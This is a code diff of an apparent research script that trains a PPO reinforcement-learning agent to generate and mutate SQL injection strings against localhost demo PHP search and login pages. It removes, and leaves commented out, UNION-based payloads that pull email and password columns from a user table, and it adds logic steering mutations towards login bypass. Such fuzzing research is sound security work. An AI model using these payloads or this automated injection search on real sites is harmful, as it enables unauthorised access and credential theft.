@@ -32,22 +32,26 @@ from Stub.Stub import StubSession
 from grammar_lib.testCaseModifier import GCheckModifier
 from grammar_lib.SQLChecker import parser
 
-# with open("grammar_lib/all_grammar_inputs.txt") as file:
-#     all_grammar_inputs = [line.strip() for line in file]
+with open("grammar_lib/all_grammar_inputs.txt") as file:
+    all_grammar_inputs = [line.strip() for line in file]
 
-all_grammar_inputs = ["' ) UNION select NULL,email,pass,NULL from user;",
-                        "' ) UNION select NULL,email,pass,NULL from user;",
-                        "' null UNION select NULL,email,pass,NULL from user;",
-                        "' null UNION select NULL,email,pass,NULL from user;",
-                        "' ) UNION select NULL,email,pass,NULL from user",
-                        "' ) UNION select NULL,email,pass,NULL from user"]
-    
 all_grammar_inputs_mod = []
 for gram_inp in all_grammar_inputs:
-    all_grammar_inputs_mod.append(gram_inp)
-    all_grammar_inputs_mod.append(gram_inp.replace("'", ')'))
+    if not any(txt_chk in gram_inp.lower() for txt_chk in ['union', 'order', 'admin', '/*', "1'="]):
+        all_grammar_inputs_mod.append(gram_inp)
+        all_grammar_inputs_mod.append(gram_inp.replace('OR', 'AND'))
+        if random.random()<0.5:
+            all_grammar_inputs_mod.append(gram_inp.replace("'", '('))
 
-all_grammar_inputs = all_grammar_inputs_mod.copy()
+        
+# union_selected_tests = ["' ) UNION select NULL,email,pass,NULL from user;",
+# "' ) UNION select NULL,email,pass,NULL from user;",
+# "' UNION select NULL,email,pass,NULL from user;",
+# "' UNION select NULL,email,pass,NULL from user;",
+# "' ) UNION select NULL,email,pass,NULL from user",
+# "' ) UNION select NULL,email,pass,NULL from user"]
+
+all_grammar_inputs = all_grammar_inputs_mod.copy()#+union_selected_tests
 
 
 # In[ ]:
@@ -100,7 +104,7 @@ VOCAB_SIZE, max_len
 """
 
 # Hyperparameters of the PPO algorithm
-MODEL_NAME = "RLFuzzPPOSearchPen_v1"
+MODEL_NAME = "RLFuzzPPOForcev1"
 steps_per_epoch = 50
 epochs = 5000
 gamma = 0.99
@@ -117,7 +121,7 @@ hidden_sizes = (64, 64)
 # In[ ]:
 
 
-MAX_LENGTH = 15 # including EOS
+MAX_LENGTH = 9 # including EOS
 
 loaded_test = [] # store compatible length grammar based init (generation) test strings
 for sent in sent_processed:
@@ -182,10 +186,9 @@ class RLFuzz:
         self.seed_str = mutate_string_list(seed=self.seed_str, pos=pos, vocab=vocab)
 
 class RLFuzzEnv:
-    EXCEPTION_PENALTY = 0.1
-    MUTATION_PENALTY = 0.2
-    SAME_STRING_PENALTY = 0.3 # eos & grammar related
-    PARSER_PENALTY = 0.5
+    MUTATION_PENALTY = 0.1
+    SAME_STRING_PENALTY = 0.2 # eos & grammar related
+    PARSER_PENALTY = 0.3
     SUCCESS_REWARD = 5
     ACTION_SPACE_SIZE_POS = MAX_LENGTH
     ACTION_SPACE_SIZE_VOCAB = VOCAB_SIZE
@@ -228,34 +231,38 @@ class RLFuzzEnv:
             # print(f"PARSER_PENALTY @ {self.episode_step}: ", username_rl)
             reward = -self.PARSER_PENALTY
         else: # check via website
+#             url2 = "http://localhost/demo/example_mysql_injection_search_box.php"
+#             jsonFilePath2='./Stub/conditions1.json'
+#             form_details2, keys2 = self.session.preprocessing_Form_Fields(url2)
+#             values2 = ["' ) UNION select null,NULL,null,NULL from user;"]
+
+#             logindata2 = self.session.form_input_feeding(keys2, values2, form_details2)
+#             pass_Conditions2, fail_Conditions2 = self.session.jsonReading(jsonFilePath2)
+#             status_ex = self.session.exceptionCatcher(url, logindata)
+#             print(status_ex)
+#             status = self.session.validation(url, logindata, keys, pass_Conditions, fail_Conditions)
+#             print(status)
             if self.last_status == 1:
                 self.session.reset_session()
 
-            url="http://localhost/demo/example_mysql_injection_search_box.php"
-            jsonFilePath = './Stub/conditions1.json'
+            url="http://localhost/demo/example_mysql_injection_login.php"
+            jsonFilePath = './Stub/conditions.json'
             receive=self.session.s.get(url)
             form_details,keys=self.session.preprocessing_Form_Fields(url)
 
-            values=[username_rl]
+            values=[username_rl, "RaNdOmStRiNg"]
             logindata=self.session.form_input_feeding(keys,values,form_details)
             pass_Conditions, fail_Conditions = self.session.jsonReading(jsonFilePath)
             status = self.session.validation(url, logindata, keys, pass_Conditions, fail_Conditions)
             self.last_status = status
-            
-            status_ex = self.session.exceptionCatcher(url, logindata)
-            
-            exception_success = True if status_ex==1 else False
 
             fuzzing_success = True if status==1 else False
 
             if fuzzing_success:
 #                 print(f"\nSUCCESS_REWARD @ {self.episode_step}: ")
 #                 print(self.fuzzer)
-#                 print(f"pos: {action_pos}, vocab: {action_vocab} -> {ind2word[action_vocab]}")
+#                 print(f"OP: {self.operation}, pos: {action_pos}, vocab: {action_vocab}-{ind2word[action_vocab]}")
                 reward = self.SUCCESS_REWARD
-            elif exception_success:
-#                 print(f"EXCEPTION_REWARD @ {self.episode_step}: ", username_rl)
-                reward = -self.EXCEPTION_PENALTY
             else:
                 # print(f"MUTATION_PENALTY @ {self.episode_step}: ", username_rl)
                 reward = -self.MUTATION_PENALTY
@@ -466,14 +473,9 @@ for epoch in tqdm(range(epochs), ascii=True, unit='episodes'):
         logits, action = sample_action(observation)
         
         obs_text_list = [ind2word[i] for i in observation[0]]
-        if ";" not in obs_text_list and obs_text_list.index("<EOS>")!=MAX_LENGTH-1 and random.random()<=0.9:
-            # print("--- semicolon ---@", t)
-            action = [env.squeeze_actions(action_pos = obs_text_list.index("<EOS>"), action_vocab = word2ind[";"])]
-            action = tf.constant(action, dtype=tf.int64)
-        
-        elif "'" in obs_text_list and ")" not in obs_text_list and random.random()<=0.9:
-            # print("--- ') ---@", t)
-            action = [env.squeeze_actions(action_pos = obs_text_list.index("'")+1, action_vocab = word2ind[")"])]
+        if "and" in obs_text_list and random.random()<=0.9:
+            # print("--- and->or ---@", t)
+            action = [env.squeeze_actions(action_pos = obs_text_list.index("and"), action_vocab = word2ind["or"])]
             action = tf.constant(action, dtype=tf.int64)
             
         elif "'" not in obs_text_list and random.random()<=0.9:
@@ -483,9 +485,6 @@ for epoch in tqdm(range(epochs), ascii=True, unit='episodes'):
             
         observation_new, reward, done = env.step(action[0].numpy())
         if reward > 0: success_count+=1
-#         print(" ".join(obs_text_list))
-#         print(" ".join(ind2word[i] for i in observation_new))
-#         print()
         episode_return += reward
         episode_length += 1
 
